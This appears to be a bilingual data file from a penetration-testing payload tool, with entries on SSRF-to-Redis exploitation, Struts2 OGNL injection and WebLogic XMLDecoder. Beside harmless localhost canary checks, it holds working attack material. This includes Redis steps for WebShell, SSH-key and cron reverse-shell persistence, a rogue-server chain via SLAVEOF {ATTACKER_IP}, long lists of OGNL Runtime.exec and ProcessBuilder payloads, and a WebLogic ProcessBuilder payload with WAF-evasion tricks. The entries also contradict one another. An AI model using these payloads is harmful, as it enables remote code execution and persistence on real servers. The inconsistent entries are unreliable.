overview.zh: SSRF Redis 可达性验证覆盖内网 Redis 全链路利用场景：针对可经 dict/gopher 触达 6379 端口的注入点，验证从协议可达确认到持久化落地的完整影响面。验证维度包含双通道可达性、WebShell/SSH 公钥/Cron 三种写入与 rogue server 主从模块加载。
overview.en: SSRF Redis Reachability Validation covers the full intranet-Redis exploitation chain: for injection points that can reach port 6379 via dict/gopher, verify the complete impact from protocol reachability to persistence. Verification dimensions include dual-channel reachability, three write primitives (WebShell, SSH public key, cron job), and rogue-server replica module loading.

vulnerability.zh: 根因是 Redis 绑定内网且未启用认证，SSRF 获取器允许 dict/gopher 直连 6379；Redis 接受 SET 与 CONFIG SET dir/dbfilename 组合后可把任意内容写盘，配合 SAVE 即落为 WebShell、authorized_keys 或 cron 任务，rogue 主从链路还能加载恶意模块。
vulnerability.en: The root cause is intranet-bound Redis running without authentication while the SSRF fetcher permits dict/gopher direct access to 6379; Redis accepts SET plus CONFIG SET dir/dbfilename, so arbitrary content is written to disk and, with SAVE, lands as a WebShell, authorized_keys, or a cron job, while the rogue replica chain can even load malicious modules.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 dict info 与 gopher PING 确认 Redis 可达；第 2 步按 set、config set dir/dbfilename、save 序列写 WebShell 并访问验证解析；第 3 步改写 authorized_keys 后用对应私钥登录 root；第 4 步写入 cron 任务等待反弹连接到达监听端口；第 5 步先经 SSRF 向目标 Redis 下发 SLAVEOF {ATTACKER_IP} 6379 指向 rogue server，再运行 redis-rogue-server.py 等待主从同步与模块推送，MODULE LOAD 日志出现即确认加载链（完成后执行 SLAVEOF NO ONE 恢复）。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 confirms Redis reachability with dict info and a gopher PING; step 2 writes a WebShell via the set, config set dir/dbfilename, and save sequence and verifies it parses; step 3 rewrites authorized_keys and logs in as root with the matching key; step 4 plants a cron job and waits for the reverse connection at your listener; step 5 runs the rogue server — MODULE LOAD logs plus completed replica sync confirm the loading chain. Replace placeholders via the global variables menu.

mitigation.zh:
获取器拒绝非 HTTP 协议并在解析后阻断内网目标；Redis 启用认证、TLS 与 ACL，禁用 CONFIG/SAVE 危险组合，持久化目录不与 Web 根、SSH、cron 共享：
      # redis.conf
      requirepass <强随机口令>
      rename-command CONFIG ""
      rename-command SAVE ""
      dir /var/lib/redis
      port 0
      tls-port 6379
  修复后用第 1 步回归确认协议不可达，SET+CONFIG+SAVE 三类写入序列全部失败。
mitigation.en: Reject non-HTTP schemes in the fetcher and block intranet targets after resolution; enable Redis authentication, TLS, and ACLs, disable the CONFIG/SAVE combination via rename-command, and keep the persistence directory disjoint from the web root, SSH, and cron directories. After the fix, regress with the step 1 sample for protocol isolation; all three write sequences must fail.

analysis.zh: SSRF Redis PING 可达性验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF Redis PING Reachability Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

description.en: Submit one fixed arithmetic OGNL expression to a localhost Struts fixture and validate the result while asserting static-method and process-start capabilities are disabled.

prerequisites.zh: 使用固定 Struts2 版本和受限 OGNL Fixture，不加载文件或命令执行辅助类。
prerequisites.en: Use a fixed Struts2 version and restricted OGNL fixture without file or command-execution helper classes.

prerequisites.en: Record excludedClasses, excludedPackageNames, and static-method-access settings.

execution.command: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/struts-lab/evaluate" -H "X-Request-ID: struts-ognl-simple-001" --data-urlencode 'value=%{7*7}' | jq -e '.result == 49 and .static_method_access == false and .process_start == false'

title.en: Validation step 1 for Apache Struts OGNL Injection

wafBypass.command:
(#context['xwork.MethodAccessor.denyMethodExecution']=false)
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)
(#rt=@java.lang.Runtime@getRuntime())
(#process=#rt.exec('id'))
(#process=#rt.exec('whoami'))
(#process=#rt.exec('cat /flag'))
(#process=#rt.exec('ls /'))
(#process=#rt.exec('pwd'))
(#process=#rt.exec('uname -a'))
(#process=#rt.exec('hostname'))
(#process=#rt.exec(new String[]{'id'}))
(#process=#rt.exec(new String[]{'whoami'}))
(#process=#rt.exec(new String[]{'cat /flag'}))
(#process=#rt.exec(new String[]{'ls /'}))
(#process=#rt.exec(new String[]{'pwd'}))
(#process=#rt.exec(new String[]{'uname -a'}))
(#process=#rt.exec(new String[]{'hostname'}))
(#process=new java.util.Scanner(#rt.exec('id').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('whoami').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('cat /flag').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('ls /').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('pwd').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('uname -a').getInputStream()).next())
(#process=new java.util.Scanner(#rt.exec('hostname').getInputStream()).next())
(#process=#rt.exec('id').waitFor())
(#process=#rt.exec('whoami').waitFor())
(#process=#rt.exec('cat /flag').waitFor())
(#process=#rt.exec('ls /').waitFor())
(#process=#rt.exec('pwd').waitFor())
(#process=#rt.exec('uname -a').waitFor())
(#process=#rt.exec('hostname').waitFor())
(#process=new java.lang.ProcessBuilder(new String[]{'id'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'whoami'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'cat /flag'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'ls /'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'pwd'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'uname -a'}).start())
(#process=new java.lang.ProcessBuilder(new String[]{'hostname'}).start())

description.zh: 基础 OGNL 注入样本集 — 覆盖 denyMethodExecution 关闭、MemberAccess 替换、Runtime.exec、Scanner 回显、waitFor 与 ProcessBuilder 六类执行形态，逐条验证求值路径并记录响应差异；命中判据：任一形态返回对应命令输出或产生进程副作用。
description.en: Run this Apache Struts OGNL Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: OGNL evaluation runs the command and returns the matching output.

overview.zh: Struts2 OGNL 简单求值边界验证针对 OGNL 表达式求值能力的场景：受限求值器是否真的关闭了危险能力。验证仅提交固定算术 OGNL，断言结果正确且静态方法与进程启动能力关闭。
overview.en: The Struts2 OGNL simple-evaluation boundary validation targets OGNL evaluation capability: does the restricted evaluator truly disable dangerous capabilities? It submits only a fixed arithmetic OGNL expression and asserts a correct result with static-method and process-start capabilities closed.

vulnerability.zh: Struts2 历史 OGNL 问题源于不可信请求值进入表达式求值且成员访问或排除策略可被绕过；单纯支持 OGNL 与算术不等于 RCE，必须证明主体可越过成员访问边界到达危险类型或方法。
vulnerability.en: Historical Struts2 OGNL issues stem from untrusted request values entering expression evaluation with bypassable member-access or exclusion policies; supporting OGNL and arithmetic alone is not RCE—you must prove the principal can cross the member-access boundary into dangerous types or methods.

exploitation.zh: 按第 1 步向本地受限求值器提交 value=%{7*7} 并携带请求 ID；命中判据为结果等于 49 且 static_method_access 与 process_start 均为 false。结果证明 OGNL 求值入口可达，能力标志证明危险边界关闭；两者结合构成配置基线。不要提交清空排除类或替换 MemberAccess 的载荷，能力标志为 true 时立即升级处理并单独取证。
exploitation.en: As in step 1, submit value=%{7*7} to the local restricted evaluator with a request ID; a hit is a result of 49 with static_method_access and process_start both false. The result proves the OGNL evaluation entry is reachable while the capability flags prove dangerous boundaries are closed—together a configuration baseline. Do not submit payloads clearing exclusion classes or replacing MemberAccess; if a capability flag is true, escalate immediately with separate evidence.

mitigation.zh:
升级到 Apache Struts 受支持版本，避免把不可信字符串作为 OGNL 求值，保持成员访问限制、排除类与包设置，数据绑定仅允许显式字段：
      <constant name="struts.devMode" value="false"/>
      <constant name="struts.ognl.allowStaticMethodAccess" value="false"/>
      <!-- 输出走转义，禁止把请求参数拼入 value 表达式 -->
      <s:property value="name" escapeHtml="true"/>
  修复后重放第 1 步请求，确认能力标志保持关闭并对异常表达式建立审计。
mitigation.en: Upgrade to supported Apache Struts versions, avoid evaluating untrusted strings as OGNL, keep member-access restrictions, exclusion classes, and package settings, and bind data through allowed fields. After the fix, replay the step-1 request, confirm capability flags stay off, and audit anomalous expressions.

analysis.zh: 结果 49 仅说明表达式被求值，不证明可访问 Runtime 或文件系统。阳性需要静态方法、成员访问或危险对象边界被突破；本批主流程明确验证这些能力为 false，执行与规避形态仅保留在 WAF 绕过参考区，不进入主验证流程。
analysis.en: Result 49 establishes expression evaluation only, not access to Runtime or the filesystem. A positive requires a static-method, member-access, or dangerous-object boundary breach; this batch asserts those capabilities false and retires execution plus evasion material.

description.zh: 向 localhost WSAT 端点提交仅含合成 marker 的 SOAP WorkContext，验证补丁后拒绝或安全处理，不包含 java、XMLDecoder、对象或方法标签。
description.en: Submit a SOAP WorkContext containing only a synthetic marker to a localhost WSAT endpoint and validate patched rejection or safe handling without java, XMLDecoder, object, or method tags.

prerequisites.zh: 使用已知 WebLogic 版本和 CPU 补丁的 localhost 容器，WSAT 无业务事务数据。
prerequisites.en: Use a localhost container with known WebLogic version and CPU patch and no business transaction data in WSAT.

prerequisites.zh: 启用 XML 解析拒绝、WorkContext 处理和网络出口日志。
prerequisites.en: Enable XML parse rejection, WorkContext handling, and network-egress logs.

title.zh: 无害 WorkContext marker 请求

execution.command: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/wls-wsat/CoordinatorPortType" -H "Content-Type: text/xml" -H "X-Request-ID: weblogic-workcontext-001" --data '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:work="http://bea.com/2004/06/soap/workarea/" xmlns:lab="urn:payloader:lab"><soapenv:Header><work:WorkContext><lab:marker>WEBLOGIC_XML_CANARY_A1</lab:marker></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>' -o /dev/null -w '%{http_code}\n'

description.zh: 向本地 WSAT 端点发送只含自定义 marker 的 SOAP，并记录拒绝状态，不包含 Java 对象标签。
description.en: Send SOAP containing only a custom marker to the local WSAT endpoint and record rejection status without Java-object tags.

opsecTips.zh: XML 仅含标准 Envelope、WorkContext 和合成 marker，不含任何 Java 类或方法标签。
opsecTips.en: Keep XML to the standard envelope, WorkContext, and synthetic marker with no Java class or method tags.

opsecTips.zh: 容器禁用外部网络与业务事务，单次请求五秒后清理 SOAP 日志。
opsecTips.en: Disable external networking and business transactions, send one five-second request, and clear SOAP logs afterward.

wafBypass.command: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/wls-wsat/CoordinatorPortType" -H "Content-Type: text/xml" --data '<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>id</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'

description.zh: ProcessBuilder 标准载荷变体 — WorkContext 内保留 ProcessBuilder、参数数组与 method="start" 的完整 XMLDecoder 结构以触发进程启动；CDATA 等结构变形是否被还原需实测，不能作为默认形态；成功判据：出现命令执行副作用或 XMLDecoder 执行日志。
description.en: Hide the payload inside a CDATA node past plaintext scanning of WorkContext; the deserialization path firing confirms success.

description.zh: 绕过仅封 CoordinatorPortType 的策略：轮换异步 WSAT 端点同语义验证；返回非 404 且 SOAP 应答即成功。
description.en: Rotate the async WSAT endpoint past CoordinatorPortType-only blocking; a SOAP response other than 404 confirms success.

description.zh: 关键类名字符实体编码：明文指纹缺失而 XML 解析还原；服务端处理无拒绝错误即成功。
description.en: Entity-encode key characters so plaintext fingerprints vanish until XML parsing restores them; the server processing without a rejection error confirms success.

overview.zh: WebLogic WorkContext 无害输入拒绝验证针对 WSAT 端点对非预期 WorkContext 内容的处理场景：补丁后应拒绝或安全处理。验证仅提交含合成 marker 的 SOAP 信封，不含任何 Java 对象标签。
overview.en: The WebLogic WorkContext harmless-input rejection validation targets WSAT endpoint handling of unexpected WorkContext content: patched instances should reject or safely process it. It submits a SOAP envelope containing only a synthetic marker, with no Java object tags.

vulnerability.zh: 历史 WebLogic XMLDecoder 问题依赖易受影响端点把攻击者 XML 交给可实例化 Java 对象的方法；端点返回、SOAP Fault 或 WorkContext 解析本身不等于对象实例化，版本、补丁和解析日志必须证明危险标签不可达。
vulnerability.en: Historical WebLogic XMLDecoder issues rely on vulnerable endpoints handing attacker XML to methods that instantiate Java objects; endpoint responses, SOAP faults, or WorkContext parsing alone do not equal object instantiation—version, patch, and parse logs must prove dangerous tags are unreachable.

exploitation.zh: 按第 1 步向 /wls-wsat/CoordinatorPortType 提交仅含 lab:marker 的 SOAP Envelope 并携带请求 ID；命中判据为端点返回拒绝状态（非 200 或 SOAP Fault），且日志显示输入被安全处理。记录响应状态与 WorkContext 解析日志作为补丁有效性证据；验证过程刻意不包含 XMLDecoder、ProcessBuilder 等任何 Java 对象标签，避免对目标产生真实执行风险。
exploitation.en: As in step 1, POST a SOAP Envelope containing only lab:marker to /wls-wsat/CoordinatorPortType with a request ID; a hit is a rejection status (non-200 or SOAP fault) with logs showing safe handling. Record the response status and WorkContext parse logs as patch-effectiveness evidence. The validation deliberately excludes XMLDecoder, ProcessBuilder, or any Java object tags, avoiding real execution risk to the target.

mitigation.en: Apply Oracle CPU patches, remove or restrict unneeded WSAT and AsyncResponseService, use strict XML parsing with element allowlists, and reject Java-object semantic tags; bind management services to controlled networks. After the fix, replay the step-1 request and confirm rejection behavior and parse logs remain consistent.

analysis.zh: HTTP 响应和 SOAP Fault 只能说明请求到达解析路径。安全结论要求危险 Java 对象标签被拒绝、无类加载和无副作用；本批请求根本不含这些标签，因此只验证补丁后的拒绝与观测边界。
analysis.en: HTTP responses and SOAP Faults show only that the request reached parsing. Security conclusions require dangerous Java-object tags to be rejected with no class loading or side effects; this request contains none and validates patched rejection plus observability only.
